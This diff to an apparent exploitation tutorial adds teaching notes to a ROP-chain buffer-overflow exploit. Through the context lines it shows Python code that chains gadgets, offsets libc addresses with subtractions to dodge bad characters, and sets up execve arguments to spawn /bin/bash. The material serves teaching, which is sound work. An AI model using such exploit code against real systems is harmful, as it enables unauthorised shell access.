@@ -803,6 +803,10 @@ search pop ebp
 </ol>
 </div></blockquote>
 <p>However, that gadget also had a side effect of adding eax to the address [ebx+0x5d5b04c4]. Rather than spraying bits “somewhere”, we set ebx = stage1addr - 0x5d5b04c4. Then [ebx+0x5d5b04c4] = stage1addr, which is the (unused) first word of stage-1.</p>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">Subtracting 0x0804a024 works for the observed value of offset. However, other offset values may not be so lucky. The exploit could be modified to compute the number of subtractions (if any) needed to avoid the “bad characters” that would terminate buffer input. In this case the number of following add ROP gadgets must be adjusted, and the offset of subsequent addresses in the buffer must also be adjusted. We leave this as a learning exercise for the reader.</p>
+</div>
 <p>Finally, the only gadget to <code class="docutils literal"><span class="pre">pop</span> <span class="pre">eax</span></code> has a <code class="docutils literal"><span class="pre">leave</span></code> instruction:</p>
 <div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">0x8048368L: pop eax ; pop ebx ; leave ;;</span>
 </pre></div>
@@ -900,7 +904,11 @@ search pop ebp
 <span class="c1">#   use gadget 0x8048368L:</span>
 <span class="c1">#     pop eax ; pop ebx ; leave ;; to setup eax and ebx for add</span>
 <span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="mh">0x8048368</span><span class="p">))</span>
-<span class="c1">#   libc offsets goes here with subtractions to avoid whitespace in value)</span>
+<span class="c1">#   libc offsets goes here with subtractions to avoid whitespace in value</span>
+<span class="c1">#   NOTE: subtracting 3 times avoids whitespace for the values we&#39;ve seen.</span>
+<span class="c1">#     For extra credit, compute the number of subtractions required and</span>
+<span class="c1">#     modify the following code to handle a variable number of subtractions</span>
+<span class="c1">#     and the resulting moving of address offsets below.</span>
 <span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="mh">0x0804a024</span> <span class="o">-</span> <span class="mh">0x0804a024</span> <span class="o">-</span> <span class="mh">0x0804a024</span><span class="p">))</span>
 <span class="c1">#   set ebx to start of .data minus a constant: stage1addr - 0x5d5b04c4</span>
 <span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">stage1addr</span><span class="o">-</span><span class="mh">0x5d5b04c4</span><span class="p">))</span>
@@ -908,6 +916,7 @@ search pop ebp
 <span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;junk&quot;</span><span class="p">)</span>
 <span class="c1">#   now correct eax by 3 times doing gadget 0x8048459L:</span>
 <span class="c1">#     add eax 0x804a024 ; add [ebx+0x5d5b04c4] eax ;;</span>
+<span class="c1">#   NOTE: number of adds should match number of subtractions above.</span>
 <span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="mh">0x8048459</span><span class="p">))</span>
 <span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="mh">0x8048459</span><span class="p">))</span>
 <span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="mh">0x8048459</span><span class="p">))</span>
@@ -927,6 +936,7 @@ search pop ebp
 <span class="c1">#   the function isn&#39;t returning</span>
 <span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;junk&quot;</span><span class="p">)</span>
 <span class="c1"># 1st argument is pointer to target bash = &quot;/bin/bash&quot;</span>
+<span class="c1"># NOTE: if computed number of adds above, this address must be adjusted.</span>
 <span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">stage1addr</span><span class="o">+</span><span class="mi">4</span><span class="o">*</span><span class="mi">19</span><span class="p">))</span>
 <span class="c1"># 2nd argument is argument array (pointer to NULL 0x8048748)</span>
 <span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">(</span> <span class="mh">0x8048748</span><span class="p">))</span>
@@ -934,6 +944,7 @@ search pop ebp
 <span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="mh">0x8048748</span><span class="p">))</span>
 <span class="c1"># Here goes &quot;/bin/bash&quot;</span>
 <span class="c1"># Target bash =  = stage1addr + (4*19)</span>
+<span class="c1"># NOTE: if computed number of adds above, refs to this address must be adjusted.</span>
 <span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">)</span>
 
 <span class="c1"># ******************************************************************************</span>
